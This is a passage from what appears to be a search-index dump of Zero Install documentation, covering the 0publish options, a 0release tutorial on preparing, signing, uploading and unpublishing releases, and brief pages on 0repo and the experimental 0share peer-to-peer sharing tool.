the signature at the start and resigns at the end. It also checks that the new feed is valid before overwriting the old copy. -g , --gpgsign Add a GPG signature block. Deprecated; use --xmlsign instead. -kKEY , --key=KEY Key to use for signing (if you have more than one, or if you want to resign with a different key). -lLOCAL , --local=LOCAL Deprecated; use --add-from instead. --manifest-algorithm=ALG Select the algorithm to use for manifest digests. --set-id=DIGEST Set the implementation ID. Note: it's usually easier to use the --archive-* options, since they calculate the digest for you. --set-main=EXEC Set the main executable. --set-arch=ARCH Set the architecture. --set-released=DATE Set the release date. Typically used as 0publish --set-released $(date +%F) feed.xml , which sets today's date. --set-stability=STABILITY Set the stability rating. --set-version=VERSION Set the version number (used when making a release from CVS). -s , --stable Mark the current testing version as stable. --select-version=VERSION Select version to use in --set-* commands. -x , --xmlsign Add an XML signature block. All remote feeds must be signed. -u , --unsign Remove any signature. -v , --verbose More verbose output (for debugging). -V , --version Display version information. FAQ gpg: signing failed: secret key not available By default, 0publish tries to sign the new version of the feed using the same key that signed the old version. You will get this error if you don't have this key (e.g. because someone else signed the old version). In that case, use -k to specify they key you want to use instead.","title":"0publish"},{"location":"tools/0publish/#general-operation","text":"0publish edits feed files in place. It loads the file, transforms it in some way (such as setting the release date, or adding a new implementation) and then writes it back out again. If the input file was signed, it will resign it when saving with the same key by default. You can also use it to add a signature, or to change the signing key. You can create an app for 0publish in the usual way: $ 0install add 0publish http://0install.net/2006/interfaces/0publish The SCons packaging tutorial shows many examples of using 0publish .","title":"General operation"},{"location":"tools/0publish/#0publish-reference","text":"Usage: 0publish [options] feed.xml","title":"0publish reference"},{"location":"tools/0publish/#options","text":"-h , --help Show help message and exit. -a FEED , --add-from=FEED Add the implementation(s) in FEED to this one, putting them in the most sensible <group> (so as to minimise duplication of requirements, etc). --add-types add missing MIME-type attributes. --add-version=VERSION Add a new implementation (use with --archive-url , etc). --archive-url=URL , --archive-file=FILE , --archive-extract=DIR Change a local implementation to one with a digest and an archive. See the SCons tutorial for an example. -c , --create Create a new feed file (if non-existent) without prompting. -d ALG , --add-digest=ALG Add extra digests using the given algorithm. -e , --edit Edit with $EDITOR . This is useful if the file is signed, since it removes the signature at the start and resigns at the end. It also checks that the new feed is valid before overwriting the old copy. -g , --gpgsign Add a GPG signature block. Deprecated; use --xmlsign instead. -kKEY , --key=KEY Key to use for signing (if you have more than one, or if you want to resign with a different key). -lLOCAL , --local=LOCAL Deprecated; use --add-from instead. --manifest-algorithm=ALG Select the algorithm to use for manifest digests. --set-id=DIGEST Set the implementation ID. Note: it's usually easier to use the --archive-* options, since they calculate the digest for you. --set-main=EXEC Set the main executable. --set-arch=ARCH Set the architecture. --set-released=DATE Set the release date. Typically used as 0publish --set-released $(date +%F) feed.xml , which sets today's date. --set-stability=STABILITY Set the stability rating. --set-version=VERSION Set the version number (used when making a release from CVS). -s , --stable Mark the current testing version as stable. --select-version=VERSION Select version to use in --set-* commands. -x , --xmlsign Add an XML signature block. All remote feeds must be signed. -u , --unsign Remove any signature. -v , --verbose More verbose output (for debugging). -V , --version Display version information.","title":"Options"},{"location":"tools/0publish/#faq","text":"","title":"FAQ"},{"location":"tools/0publish/#gpg-signing-failed-secret-key-not-available","text":"By default, 0publish tries to sign the new version of the feed using the same key that signed the old version. You will get this error if you don't have this key (e.g. because someone else signed the old version). In that case, use -k to specify they key you want to use instead.","title":"gpg: signing failed: secret key not available"},{"location":"tools/0release/","text":"Name: 0release Maintainer: Thomas Leonard License: GNU Lesser General Public License Source: Git repository Zero Install feed: http://0install.net/2007/interfaces/0release.xml 0release can be used to make new releases of your software. It handles details such as setting the version number and release date, tagging the release in your version control system and updating your Zero Install feed. The general process for an architecture-independent package (e.g. a Python program) is shown in the diagram below ( releasing a source package and multiple binary packages is also possible): After doing some development (so you have something to release!) you use 0release to prepare a new release. It will: Commit a release revision in your version control system (e.g. with a version of 1.3 ) on a new temporary branch. Export the release revision and create a tarball for distribution. Unpack the release and run the unit tests. Update the version numbers in your version control system again (e.g. to 1.3-post ). You can then run any final (manual) tests on the release. If you're happy with the result, then 0release can publish it (e.g. upload the tarball to an FTP server, update the Zero Install feed, and push the new commits and tag to your public version control system). Otherwise, 0release will discard the temporary branch so that you can fix the problems and try again. Note: you don't need to use this program to make your software available through Zero Install. You can just create a tarball using your normal process and then publish a feed for it. However, 0release can automate some of the steps for you. It's especially useful for new projects, where you don't yet have an established process. Having a program to handle new releases brings several advantages over doing it manually: Making a new release is quicker, since many steps are automated. You can't forget some steps (did you forget to tag version 1.2? did you remember to compile the translations in 1.4? etc). You get a consistent structure each time (are your archives called myprog-V.VV-linux.tgz or My-Prog-Linux-V.VV.tar.gz ?). If someone else needs to make a release, they will follow the same process. Version control systems currently supported Git is fully supported. It should be fairly easy to support other (distributed) version control systems. Contents: Preparing your source repository Creating the releases directory Use with 0repo Use without 0repo (deprecated) Creating a release candidate Accepting the release candidate Uploading the files Customising the release process Source and binaries Aborting a release Unpublishing a release Uploading to SourceForge.net Do I need to keep the releases directory? Preparing your source repository You'll need a local feed within your source directory (under version control). This contains the same information as a normal published feed would (name, description, dependencies, etc). The only differences are: The local feed refers to a local directory (e.g. id=\".\" for the directory containing the local feed) rather than a secure hash. It has no digital signature. The version will be a development version (e.g 1.2-post if your last released version was 1.2 ). Having a local feed is useful even if you don't use 0release , because it lets people check out a development snapshot of your program and then register it (using 0launch --feed ) or run it directly with Zero Install handling its dependencies. A minimal Hello World example is available for testing. You can check it out like this, using the Git version control system: $ git clone git://github.com/0install/hello-python.git To check that you can run it, use 0launch on the feed: $ cd hello-python $ 0launch HelloWorld.xml Hello World! HelloWorld.xml is the local feed. Its contents look like this: <?xml version=\"1.0\" ?> <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <name>HelloWorld</name> <summary>minimal demonstration package for 0release</summary> <description> This program outputs the message \"Hello World\". You can create new releases of it using 0release. </description> <homepage>http://0install.net/0release.xml</homepage> <feed-for interface='http://0install.net/tests/HelloWorld.xml'/> <implementation id=\".\" version=\"0.1-pre\"> <command name='run' path='hello.py'> <runner interface='http://repo.roscidus.com/python/python'> <version before='3'/> </runner> </command> </implementation> </interface> Note the <feed-for> element. This is where the main feed is (or will be) published. If you want to follow this tutorial, change it to point to a location to which you can upload files (e.g. http://localhost/~me/testing/HelloWorld.xml ) and commit the change ( git commit -a ). You should add any dependencies inside the <implementation> element (see the feed specification for details, or edit the feed using 0publish-gui if you want a graphical interface). This example program is so simple it doesn't have any dependencies beyond its interpreter: Python < 3 Creating the releases directory Each time you create a new release, the resulting files go in your releases directory. Create the directory now and then run 0release inside it, giving it the location of your local feed. $ mkdir -p ~/releases/hello $ cd ~/releases/hello $ 0launch http://0install.net/2007/interfaces/0release.xml ~/hello/HelloWorld.xml Setting up releases directory for HelloWorld Success - created script: ~/releases/hello/make-release Now edit it with your local settings. Then, create new releases by running it. This will create a single executable file in the directory, called make-release . Run this whenever you want to create a new release of your software. The make-release file contains local configuration information (e.g. the location of the local feed on your computer). General information about your program goes in the source directory so it can be shared by other developers. Warning: Do not put make-release under the project's version control! First, because it contains user-specific information, and secondly because if you make a mistake in e.g. the upload command and then fix it, 0release will make you retract the release and restart the whole release process from the beginning because you changed a file that's part of the release... this is not fun ;-) Use with 0repo 0release >= 0.15 contains support for the new 0repo repository management system. If you use this, most of the settings in the make-release file can be removed. For example, the complete configuration for 0release itself (0install.net uses 0repo) is: #!/bin/sh cd `dirname \"$0\"` exec 0launch http://0install.net/2007/interfaces/0release.xml \\ --release /home/tal/Projects/zero-install/0release/0release.xml \\ --public-scm-repository=origin \\ \"$@\" Use without 0repo (deprecated) Open the file in a text editor. There are five settings, with comments explaining what is needed. The only one you need to set is the first ( ARCHIVE_DIR_PUBLIC_URL ), which is where people will download the release from. In my case, I'll be uploading them to SourceForge so I set it to: ARCHIVE_DIR_PUBLIC_URL='http://downloads.sourceforge.net/project/zero-install/hello/$RELEASE_VERSION' Note that $RELEASE_VERSION is used because SourceForge puts each archive in a different directory, whose name is the version number. If you put all your archives in a single directory, you don't need this. e.g. you could use: ARCHIVE_DIR_PUBLIC_URL='http://localhost/~me/testing' The other settings allow 0release to push files to the remote server automatically, but you can leave them as they are and do it manually if you prefer. Creating a release candidate When you want to make a new release, simply run the make-release script, like this: $ cd ~/releases/hello $ ./make-release Releasing HelloWorld Snapshot version is 0.1-pre Version number for new release [0.1]: You are prompted to enter the version number for the new release. You can just press Return to accept the default of 0.1 (since the version in the local feed was 0.1-pre ). It then prints: Releasing version 0.1 HEAD is now at 387535a Updated feed-for to localhost for testing SKIPPING unit tests for ~/releases/hello/0.1/helloworld-0.1 (no 'self-test' attribute set) Wrote source feed as helloworld-0.1.xml Wrote changelog from start to here as changelog-0.1 Candidate release archive: helloworld-0.1.tar.bz2 (extracted to ~/releases/hello/0.1/helloworld-0.1 for inspection) Please check candidate and select an action: P) Publish candidate (accept) F) Fail candidate (delete release-status file) (you can also hit CTRL-C and resume this script when done) Publish/Fail: 0release has now created a candidate archive for you to examine. You might like to try running the program now. Note that the archive only contains files that are under version control. You can either leave 0release running while you check it, or you can press CTRL-C to exit and run the make-release script again later. It will remember where it was (it stores the current status in a new release-status file). As well as exporting the release archive, 0release also updates your Git repository by committing two new revisions. You can see them using gitk --all : The lowest two revisions are the history you started with. The master branch adds the commit where you changed the <feed-for> element. This is also the currently checked-out version. 0release has created a new branch called 0release-tmp with two new revisions. Release 0.1 is the version that will be released. Its local feed has the version 0.1 and today's date as the release date. The archive was created from this revision. The next revision has a version of 0.1-post and removes the release date again. Note that the release hasn't been tagged yet in Git, but 0release has recorded the revision ID in case you decide to accept the release candidate. If you discover any problems you can go ahead and commit a fix, which will appear on the master branch (not on the 0release-tmp branch, which will be discarded if you fail the release). Accepting the release candidate We'll just check that the release works: $ 0launch 0.1/helloworld-0.1/HelloWorld.xml Hello World! Looks good. If you killed the release script (with CTRL-C), run it again now to return to the Publish/Fail prompt. Choose Publish (you can just type p<Return> ). The temporary files ( release-status and the extracted helloworld-0.1 directory) are removed, and you will be prompted to enter your GPG passphrase to sign the release (use --key if you don't want to use the default key). Tagged as v0.1 HEAD is now at 07f3c9e Start development series 0.1-post Deleted branch 0release-tmp. Changing key from 'None' to 'YOUR-KEY' Exported public key as '~/releases/hello/YOUR-KEY.gpg' A new file then appears: HelloWorld.xml . This is the master feed for the program, which you should publish on your web-site. It will list all versions of the program (although currently it only contains one version, of course). Finally, you will also find a .gpg file containing your GPG public key. If you check your Git repository, you'll see that 0release has now tagged the release, and updated the \"master\" branch to the tip of the temporary branch: If, instead, you had found a problem with the release you would have selected Fail at the prompt. 0release would have removed the temporary branch (leaving master where it was) and deleted the temporary files. Uploading the files Note: Uploading directly with 0release is deprecated: Consider using 0repo instead to upload the files. That way, if you publish several different programs on your site you only have to configure things once. To use 0release with 0repo, just do 0repo register so that 0release can find the repository to use. If you didn't set an upload command in the make-release configuration file, 0release will prompt you to upload the files now: Upload status: - helloworld-0.1.tar.bz2 : Upload required Upload 0.1/helloworld-0.1.tar.bz2 as http://downloads.sourceforge.net/project/zero-install/hello/0.1/helloworld-0.1.tar.bz2 No upload command is set => please upload the archive manually now Press Return once the archive is uploaded. Copy the archive ( helloworld-0.1.tar.bz2 ) to your web-server. When you press Return, 0release will check that the archive was uploaded correctly: Testing URL http://downloads.sourceforge.net/project/zero-install/hello/0.1/helloworld-0.1.tar.bz2... Upload status: - helloworld-0.1.tar.bz2 : Upload has been checked (exists and has correct size) Finally, it will prompt you to upload the feed and the new Git commits: Upload ~/releases/hello/HelloWorld.xml into http://0install.net/tests NOTE: No feed upload command set => you'll have to upload them yourself! Push changes to public SCM repository... NOTE: No public repository set => you'll have to push the tag and trunk yourself. After uploading HelloWorld.xml (to the URL you put in the feed-for) and <KEYID>.gpg (to the same directory), you should then be able to download and run the new release, using the URL you chose at the start: $ 0launch http://localhost/~me/testing/HelloWorld.xml Hello World! You can edit make-release to set some commands to automatically upload the files and to push the branch and tag ( master and v0.1 in this case) to your public Git repository. Tip: to check that all files are present, use FeedLint : $ 0launch http://0install.net/2007/interfaces/FeedLint.xml http://localhost/~me/testing/HelloWorld.xml Customising the release process For more information, see release phases . Source and binaries If your program needs to be compiled, see Releasing binaries . Aborting a release You can abort a release easily at any point before the Publish step. Once you select Publish , externally-visible changes start to be made (e.g. archives are uploaded to your file-server). To abort before publishing Just select Fail from the menu. This deletes the release-status file (which you could also do manually). To avoid confusion, selecting Fail also removes the temporary release branch from Git and renames the release directory (to $version~ ) to make it clear that they're not being used. To abort after publishing has started Follow the steps in Unpublishing a release below to undo any publicly visible changes. Then delete the release-status file. Unpublishing a release So, you didn't test the release properly, and now you want to pull it down, eh? The best way to do this is to use 0publish-gui to set the stability to BUGGY, and then publish a new fixed release, with a new version number. But if you really insist on trying to unpublish a release and pretending it never happened, here's what you have to do: Edit the master feed (e.g. with 0publish-gui ) and delete the new <implementation> . Don't just use a text editor; the signature needs updating too! Push the new version to your server. Note: if you keep your feed under version control then you could revert the change. However, if anyone got the new version before you reverted it, then 0launch will refuse to go back to the previous version, assuming that this is a replay attack. So create a new signature, with a fresh time-stamp. Reset HEAD to before the release (e.g. git reset --hard v0.1^ ) and delete the tag itself (e.g. git tag -d v0.1 ). Delete the remote tag at the server (e.g. git push origin :v0.1 master ). Like 0launch , if anyone saw the release in Git, their Git will refuse to go back to an older version. Tell them to use -f . Delete the tarball from your server. Uploading to SourceForge.net To upload to SourceForge's File Release System, you need the project name, user name, program name and release version number. I use a script to upload archives to SourceForge . To use it: Put the script in your $PATH as 0release-upload-archive-sf . Edit it to contain your sf.net username, not mine (the line user = 'tal197' ) In your make-release script, use these settings: PROJECT=zero-install PROGRAM=0release ARCHIVE_DIR_PUBLIC_URL=\"http://downloads.sourceforge.net/project/$PROJECT/$PROGRAM/\"'$RELEASE_VERSION' ARCHIVE_UPLOAD_COMMAND=\"0release-upload-archive-sf $PROJECT $PROGRAM \"'\"$@\"' The tricky quoting is because $PROJECT and $PROGRAM expand when the script is read, but $RELEASE_VERSION and $@ expand when the command is later executed. Replace zero-install with the name of your project and 0release with the name of your program. These instructions are correct for sf.net as of 2009-08-15. Do I need to keep the releases directory? It's best to keep the releases directory: You want to keep the make-release script so you don't have to write it again each time. You need the master feed so that 0release can add new versions to it, rather than creating a new feed each time. However, you can get the latest version of the feed from the cache (or directly from the web) if you lose the local copy. Keeping the previous archive allows diffing against it as an extra check when making a new release. So, there's nothing too critical in the directory, but it's easiest to keep everything. TODO: 0release should compare the local copy of the feed with the one on the web and warn if the local one is missing or out of sync. This would also be useful for allowing several people to publish new releases for a single feed easily. TODO: 0release should also be able to diff against the previous version using the cache (downloading the archive if missing), rather than relying on the previous archive being in the releases directory.","title":"0release"},{"location":"tools/0release/#preparing-your-source-repository","text":"You'll need a local feed within your source directory (under version control). This contains the same information as a normal published feed would (name, description, dependencies, etc). The only differences are: The local feed refers to a local directory (e.g. id=\".\" for the directory containing the local feed) rather than a secure hash. It has no digital signature. The version will be a development version (e.g 1.2-post if your last released version was 1.2 ). Having a local feed is useful even if you don't use 0release , because it lets people check out a development snapshot of your program and then register it (using 0launch --feed ) or run it directly with Zero Install handling its dependencies. A minimal Hello World example is available for testing. You can check it out like this, using the Git version control system: $ git clone git://github.com/0install/hello-python.git To check that you can run it, use 0launch on the feed: $ cd hello-python $ 0launch HelloWorld.xml Hello World! HelloWorld.xml is the local feed. Its contents look like this: <?xml version=\"1.0\" ?> <interface xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"> <name>HelloWorld</name> <summary>minimal demonstration package for 0release</summary> <description> This program outputs the message \"Hello World\". You can create new releases of it using 0release. </description> <homepage>http://0install.net/0release.xml</homepage> <feed-for interface='http://0install.net/tests/HelloWorld.xml'/> <implementation id=\".\" version=\"0.1-pre\"> <command name='run' path='hello.py'> <runner interface='http://repo.roscidus.com/python/python'> <version before='3'/> </runner> </command> </implementation> </interface> Note the <feed-for> element. This is where the main feed is (or will be) published. If you want to follow this tutorial, change it to point to a location to which you can upload files (e.g. http://localhost/~me/testing/HelloWorld.xml ) and commit the change ( git commit -a ). You should add any dependencies inside the <implementation> element (see the feed specification for details, or edit the feed using 0publish-gui if you want a graphical interface). This example program is so simple it doesn't have any dependencies beyond its interpreter: Python < 3","title":"Preparing your source repository"},{"location":"tools/0release/#creating-the-releases-directory","text":"Each time you create a new release, the resulting files go in your releases directory. Create the directory now and then run 0release inside it, giving it the location of your local feed. $ mkdir -p ~/releases/hello $ cd ~/releases/hello $ 0launch http://0install.net/2007/interfaces/0release.xml ~/hello/HelloWorld.xml Setting up releases directory for HelloWorld Success - created script: ~/releases/hello/make-release Now edit it with your local settings. Then, create new releases by running it. This will create a single executable file in the directory, called make-release . Run this whenever you want to create a new release of your software. The make-release file contains local configuration information (e.g. the location of the local feed on your computer). General information about your program goes in the source directory so it can be shared by other developers. Warning: Do not put make-release under the project's version control! First, because it contains user-specific information, and secondly because if you make a mistake in e.g. the upload command and then fix it, 0release will make you retract the release and restart the whole release process from the beginning because you changed a file that's part of the release... this is not fun ;-)","title":"Creating the releases directory"},{"location":"tools/0release/#use-with-0repo","text":"0release >= 0.15 contains support for the new 0repo repository management system. If you use this, most of the settings in the make-release file can be removed. For example, the complete configuration for 0release itself (0install.net uses 0repo) is: #!/bin/sh cd `dirname \"$0\"` exec 0launch http://0install.net/2007/interfaces/0release.xml \\ --release /home/tal/Projects/zero-install/0release/0release.xml \\ --public-scm-repository=origin \\ \"$@\"","title":"Use with 0repo"},{"location":"tools/0release/#use-without-0repo-deprecated","text":"Open the file in a text editor. There are five settings, with comments explaining what is needed. The only one you need to set is the first ( ARCHIVE_DIR_PUBLIC_URL ), which is where people will download the release from. In my case, I'll be uploading them to SourceForge so I set it to: ARCHIVE_DIR_PUBLIC_URL='http://downloads.sourceforge.net/project/zero-install/hello/$RELEASE_VERSION' Note that $RELEASE_VERSION is used because SourceForge puts each archive in a different directory, whose name is the version number. If you put all your archives in a single directory, you don't need this. e.g. you could use: ARCHIVE_DIR_PUBLIC_URL='http://localhost/~me/testing' The other settings allow 0release to push files to the remote server automatically, but you can leave them as they are and do it manually if you prefer.","title":"Use without 0repo (deprecated)"},{"location":"tools/0release/#creating-a-release-candidate","text":"When you want to make a new release, simply run the make-release script, like this: $ cd ~/releases/hello $ ./make-release Releasing HelloWorld Snapshot version is 0.1-pre Version number for new release [0.1]: You are prompted to enter the version number for the new release. You can just press Return to accept the default of 0.1 (since the version in the local feed was 0.1-pre ). It then prints: Releasing version 0.1 HEAD is now at 387535a Updated feed-for to localhost for testing SKIPPING unit tests for ~/releases/hello/0.1/helloworld-0.1 (no 'self-test' attribute set) Wrote source feed as helloworld-0.1.xml Wrote changelog from start to here as changelog-0.1 Candidate release archive: helloworld-0.1.tar.bz2 (extracted to ~/releases/hello/0.1/helloworld-0.1 for inspection) Please check candidate and select an action: P) Publish candidate (accept) F) Fail candidate (delete release-status file) (you can also hit CTRL-C and resume this script when done) Publish/Fail: 0release has now created a candidate archive for you to examine. You might like to try running the program now. Note that the archive only contains files that are under version control. You can either leave 0release running while you check it, or you can press CTRL-C to exit and run the make-release script again later. It will remember where it was (it stores the current status in a new release-status file). As well as exporting the release archive, 0release also updates your Git repository by committing two new revisions. You can see them using gitk --all : The lowest two revisions are the history you started with. The master branch adds the commit where you changed the <feed-for> element. This is also the currently checked-out version. 0release has created a new branch called 0release-tmp with two new revisions. Release 0.1 is the version that will be released. Its local feed has the version 0.1 and today's date as the release date. The archive was created from this revision. The next revision has a version of 0.1-post and removes the release date again. Note that the release hasn't been tagged yet in Git, but 0release has recorded the revision ID in case you decide to accept the release candidate. If you discover any problems you can go ahead and commit a fix, which will appear on the master branch (not on the 0release-tmp branch, which will be discarded if you fail the release).","title":"Creating a release candidate"},{"location":"tools/0release/#accepting-the-release-candidate","text":"We'll just check that the release works: $ 0launch 0.1/helloworld-0.1/HelloWorld.xml Hello World! Looks good. If you killed the release script (with CTRL-C), run it again now to return to the Publish/Fail prompt. Choose Publish (you can just type p<Return> ). The temporary files ( release-status and the extracted helloworld-0.1 directory) are removed, and you will be prompted to enter your GPG passphrase to sign the release (use --key if you don't want to use the default key). Tagged as v0.1 HEAD is now at 07f3c9e Start development series 0.1-post Deleted branch 0release-tmp. Changing key from 'None' to 'YOUR-KEY' Exported public key as '~/releases/hello/YOUR-KEY.gpg' A new file then appears: HelloWorld.xml . This is the master feed for the program, which you should publish on your web-site. It will list all versions of the program (although currently it only contains one version, of course). Finally, you will also find a .gpg file containing your GPG public key. If you check your Git repository, you'll see that 0release has now tagged the release, and updated the \"master\" branch to the tip of the temporary branch: If, instead, you had found a problem with the release you would have selected Fail at the prompt. 0release would have removed the temporary branch (leaving master where it was) and deleted the temporary files.","title":"Accepting the release candidate"},{"location":"tools/0release/#uploading-the-files","text":"Note: Uploading directly with 0release is deprecated: Consider using 0repo instead to upload the files. That way, if you publish several different programs on your site you only have to configure things once. To use 0release with 0repo, just do 0repo register so that 0release can find the repository to use. If you didn't set an upload command in the make-release configuration file, 0release will prompt you to upload the files now: Upload status: - helloworld-0.1.tar.bz2 : Upload required Upload 0.1/helloworld-0.1.tar.bz2 as http://downloads.sourceforge.net/project/zero-install/hello/0.1/helloworld-0.1.tar.bz2 No upload command is set => please upload the archive manually now Press Return once the archive is uploaded. Copy the archive ( helloworld-0.1.tar.bz2 ) to your web-server. When you press Return, 0release will check that the archive was uploaded correctly: Testing URL http://downloads.sourceforge.net/project/zero-install/hello/0.1/helloworld-0.1.tar.bz2... Upload status: - helloworld-0.1.tar.bz2 : Upload has been checked (exists and has correct size) Finally, it will prompt you to upload the feed and the new Git commits: Upload ~/releases/hello/HelloWorld.xml into http://0install.net/tests NOTE: No feed upload command set => you'll have to upload them yourself! Push changes to public SCM repository... NOTE: No public repository set => you'll have to push the tag and trunk yourself. After uploading HelloWorld.xml (to the URL you put in the feed-for) and <KEYID>.gpg (to the same directory), you should then be able to download and run the new release, using the URL you chose at the start: $ 0launch http://localhost/~me/testing/HelloWorld.xml Hello World! You can edit make-release to set some commands to automatically upload the files and to push the branch and tag ( master and v0.1 in this case) to your public Git repository. Tip: to check that all files are present, use FeedLint : $ 0launch http://0install.net/2007/interfaces/FeedLint.xml http://localhost/~me/testing/HelloWorld.xml","title":"Uploading the files"},{"location":"tools/0release/#customising-the-release-process","text":"For more information, see release phases .","title":"Customising the release process"},{"location":"tools/0release/#source-and-binaries","text":"If your program needs to be compiled, see Releasing binaries .","title":"Source and binaries"},{"location":"tools/0release/#aborting-a-release","text":"You can abort a release easily at any point before the Publish step. Once you select Publish , externally-visible changes start to be made (e.g. archives are uploaded to your file-server). To abort before publishing Just select Fail from the menu. This deletes the release-status file (which you could also do manually). To avoid confusion, selecting Fail also removes the temporary release branch from Git and renames the release directory (to $version~ ) to make it clear that they're not being used. To abort after publishing has started Follow the steps in Unpublishing a release below to undo any publicly visible changes. Then delete the release-status file.","title":"Aborting a release"},{"location":"tools/0release/#unpublishing-a-release","text":"So, you didn't test the release properly, and now you want to pull it down, eh? The best way to do this is to use 0publish-gui to set the stability to BUGGY, and then publish a new fixed release, with a new version number. But if you really insist on trying to unpublish a release and pretending it never happened, here's what you have to do: Edit the master feed (e.g. with 0publish-gui ) and delete the new <implementation> . Don't just use a text editor; the signature needs updating too! Push the new version to your server. Note: if you keep your feed under version control then you could revert the change. However, if anyone got the new version before you reverted it, then 0launch will refuse to go back to the previous version, assuming that this is a replay attack. So create a new signature, with a fresh time-stamp. Reset HEAD to before the release (e.g. git reset --hard v0.1^ ) and delete the tag itself (e.g. git tag -d v0.1 ). Delete the remote tag at the server (e.g. git push origin :v0.1 master ). Like 0launch , if anyone saw the release in Git, their Git will refuse to go back to an older version. Tell them to use -f . Delete the tarball from your server.","title":"Unpublishing a release"},{"location":"tools/0release/#uploading-to-sourceforgenet","text":"To upload to SourceForge's File Release System, you need the project name, user name, program name and release version number. I use a script to upload archives to SourceForge . To use it: Put the script in your $PATH as 0release-upload-archive-sf . Edit it to contain your sf.net username, not mine (the line user = 'tal197' ) In your make-release script, use these settings: PROJECT=zero-install PROGRAM=0release ARCHIVE_DIR_PUBLIC_URL=\"http://downloads.sourceforge.net/project/$PROJECT/$PROGRAM/\"'$RELEASE_VERSION' ARCHIVE_UPLOAD_COMMAND=\"0release-upload-archive-sf $PROJECT $PROGRAM \"'\"$@\"' The tricky quoting is because $PROJECT and $PROGRAM expand when the script is read, but $RELEASE_VERSION and $@ expand when the command is later executed. Replace zero-install with the name of your project and 0release with the name of your program. These instructions are correct for sf.net as of 2009-08-15.","title":"Uploading to SourceForge.net"},{"location":"tools/0release/#do-i-need-to-keep-the-releases-directory","text":"It's best to keep the releases directory: You want to keep the make-release script so you don't have to write it again each time. You need the master feed so that 0release can add new versions to it, rather than creating a new feed each time. However, you can get the latest version of the feed from the cache (or directly from the web) if you lose the local copy. Keeping the previous archive allows diffing against it as an extra check when making a new release. So, there's nothing too critical in the directory, but it's easiest to keep everything. TODO: 0release should compare the local copy of the feed with the one on the web and warn if the local one is missing or out of sync. This would also be useful for allowing several people to publish new releases for a single feed easily. TODO: 0release should also be able to diff against the previous version using the cache (downloading the archive if missing), rather than relying on the previous archive being in the releases directory.","title":"Do I need to keep the releases directory?"},{"location":"tools/0repo/","text":"Name: 0repo Maintainer: Thomas Leonard License: GNU Lesser General Public License Source: Git repository Zero Install feed: http://0install.net/tools/0repo.xml 0repo provides an easy and reliable way to maintain a repository of 0install software for others to use. Figure 1 shows a simple deployment where a single developer provides a set of packages using 0install. The developer runs 0repo to create a repository on their local machine and rsync s the generated files to their static web hosting. To make a new release, the developer uses tools such as 0template or 0release to create a new release, which 0repo then adds to the repository. Figure 1: Typical single-developer deployment of 0repo 0repo is new and a little experimental, but feedback is welcome! We hope soon to support multi-developer deployments, where 0repo runs on a server and accepts contributions from a set of developers (as shown in figure 2). Figure 2: Multi-developer deployment To get it: $ 0install add 0repo http://0install.net/tools/0repo.xml Full instructions can be found in 0repo's README .","title":"0repo"},{"location":"tools/0share/","text":"Name: 0share Maintainer: Thomas Leonard License: GNU General Public License Source: Git repository Zero Install feed: http://0install.net/2008/interfaces/0share.xml 0share provides for local peer-to-peer distribution of Zero Install implementations (versions of programs). This means that once one machine on your local network has downloaded something, other machines can get it directly from the first one. This program is an experimental proof-of-concept. It currently requires a modified version of 0install, which can be found in the peer2peer branch. This branch is now very out-of-date. If you'd like to take over this project, please get in touch ! Testing To try it out, run this command on one machine: machine1 $ 0launch http://0install.net/2008/interfaces/0share.xml INFO:root:0share started and listening for requests... INFO:root:Serving implementations from Store '/home/me/.cache/0install.net/implementations' INFO:root:Serving implementations from Store '/var/cache/0install.net/implementations' On another machine on the same network, run this command, replacing DIGEST with the digest of a program installed on the first machine (e.g. the name of a subdirectory of /var/cache/0install.net/implementations/ ). The digest will be in the program's feed file. machine2 $ 0launch http://0install.net/2008/interfaces/0share.xml -f DIGEST The second machine will broadcast a request (to UDP port 38339) to see if anyone has the given implementation. The first machine should respond. The second machine will then fetch it from the first: machine2 $ ./0share -f sha1new=84e37424bbb87a077e25cec87d3c668f12726817 INFO:root:Broadcasting query for ['sha1new=84e37424bbb87a077e25cec87d3c668f12726817'] on local network... 192.168.2.1 has sha1new=84e37424bbb87a077e25cec87d3c668f12726817 INFO:root:Connecting to 192.168.2.1 to request sha1new=84e37424bbb87a077e25cec87d3c668f12726817 INFO:root:Caching new implementation (digest sha1new=84e37424bbb87a077e25cec87d3c668f12726817) Success The requested version should now be in machine2's cache. On the source machine, you should see something like: INFO:root:Request from ('192.168.2.2', 53182): '0share\\nsha1new=84e37424bbb87a077e25cec87d3c668f12726817' INFO:root:Yes, we have sha1new=84e37424bbb87a077e25cec87d3c668f12726817 INFO:root:Sending reply... INFO:root:GET /implementation/sha1new=84e37424bbb87a077e25cec87d3c668f12726817 machine2 - - [13/Dec/2008 21:52:49] \"GET /implementation/sha1new=84e37424bbb87a077e25cec87d3c668f12726817 HTTP/1.1\" 200 - Debugging If it doesn't work: Check that your firewall allows TCP and UDP connections to port 38339 on the first machine. Try using -H on the second machine to give the hostname of the first machine explicitly. If you get \"Network is unreachable\", you may be missing a default route (see ip route ). Realistic configuration Before you start, you should enable sharing on all machines. This ensures that implementations all go in the single machine-wide shared cache ( /var/cache/0install.net/implementations/ ). You'll probably want to run 0share without write access anywhere (for security), so create a new user for that and try running it: $ sudo adduser --system zeroshare $ sudo su zeroshare -s /usr/bin/env -- 0launch -vc http://0install.net/2008/interfaces/0share.xml You can then add a line to your crontab file to make it start on boot: @reboot zeroshare 0launch -vc http://0install.net/2008/interfaces/0share.xml 2>&1 >/dev/null Using with 0launch As this is experimental, you'll need to use the peer2peer branch of 0install. In that branch, P2P support is turned on when using the GUI for downloads.","title":"0share"},{"location":"tools/0share/#testing","text":"To try it out, run this command on one machine: machine1 $ 0launch http://0install.net/2008/interfaces/0share.xml INFO:root:0share started and listening for requests... INFO:root:Serving implementations from Store '/home/me/.cache/0install.net/implementations' INFO:root:Serving implementations from Store '/var/cache/0install.net/implementations' On another machine on the same network, run this command, replacing DIGEST with the digest of a program installed on the first machine (e.g. the name of a subdirectory of /var/cache/0install.net/implementations/ ). The digest will be in the program's feed file. machine2 $ 0launch http://0install.net/2008/interfaces/0share.xml -f DIGEST The second machine will broadcast a request (to UDP port 38339) to see if anyone has the given implementation. The first machine should respond. The second machine will then fetch it from the first: machine2 $ ./0share -f sha1new=84e37424bbb87a077e25cec87d3c668f12726817 INFO:root:Broadcasting query for ['sha1new=84e37424bbb87a077e25cec87d3c668f12726817'] on local network... 192.168.2.1 has sha1new=84e37424bbb87a077e25cec87d3c668f12726817 INFO:root:Connecting to 192.168.2.1 to request 